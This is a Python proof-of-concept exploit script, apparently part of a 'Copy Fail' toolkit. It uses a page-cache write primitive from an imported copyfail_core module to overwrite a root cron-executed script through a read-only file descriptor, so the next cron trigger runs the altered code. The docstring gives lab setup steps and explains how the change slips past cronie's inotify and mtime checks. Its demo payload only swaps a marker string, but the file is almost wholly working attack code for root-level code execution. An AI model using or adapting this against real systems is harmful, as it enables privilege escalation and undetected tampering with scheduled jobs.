#!/usr/bin/env python3
"""
Copy Fail — Cron script tampering
===================================
Overwrites an existing cron-executed script in page cache, so the next
scheduled cron trigger runs the tampered version.

This modifies the SCRIPT referenced by a cron job, not the cron config
file itself. crond reads and executes the script each time it fires,
picking up page cache modifications immediately.

Note: directly modifying /etc/cron.d/ config files does NOT work reliably
because cronie uses inotify + ctime/mtime to detect changes. Page cache
modifications do not trigger inotify events or update file metadata,
so crond ignores the change until it is restarted.

Setup required:
  1. Create a script: /tmp/copyfail-lab/cron_target.sh
     #!/bin/bash
     echo "ORIGINAL $(date +%s)" >> /tmp/copyfail-lab/cron.log

  2. Create a cron job (as root):
     echo '* * * * * root /tmp/copyfail-lab/cron_target.sh' > /etc/cron.d/copyfail_test

  3. Wait for first trigger, confirm "ORIGINAL" appears in cron.log

  4. Run this script to tamper the cron target

  5. Wait for next trigger, confirm "HIJACKED" appears in cron.log

Tested on: CentOS Stream 8 (cronie 1.5.2)
"""
import os
import sys
from copyfail_core import page_cache_write

DEFAULT_TARGET = "/tmp/copyfail-lab/cron_target.sh"
SEARCH_BYTES = b"ORIGINAL"
REPLACE_BYTES = b"HIJACKED"


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET
    if not os.path.isfile(target):
        print(f"[-] {target} not found")
        print("[*] See script header for setup instructions")
        sys.exit(1)

    with open(target, "rb") as f:
        content = f.read()

    offset = content.find(SEARCH_BYTES)
    if offset < 0:
        print(f"[-] '{SEARCH_BYTES.decode()}' not found in {target}")
        sys.exit(1)

    print(f"[*] Target script: {target}")
    print(f"[*] Found '{SEARCH_BYTES.decode()}' at offset {offset}")
    print(f"[*] Replacing with '{REPLACE_BYTES.decode()}'")

    fd = os.open(target, os.O_RDONLY)
    page_cache_write(fd, offset, REPLACE_BYTES)

    os.lseek(fd, offset, os.SEEK_SET)
    result = os.read(fd, len(REPLACE_BYTES))
    os.close(fd)

    if result == REPLACE_BYTES:
        print(f"[+] SUCCESS: script tampered in page cache")
        print(f"[*] Next cron trigger will execute the modified script")
        print(f"[*] Restore: echo 3 > /proc/sys/vm/drop_caches")
    else:
        print(f"[-] Verification failed: {result}")


if __name__ == "__main__":
    main()
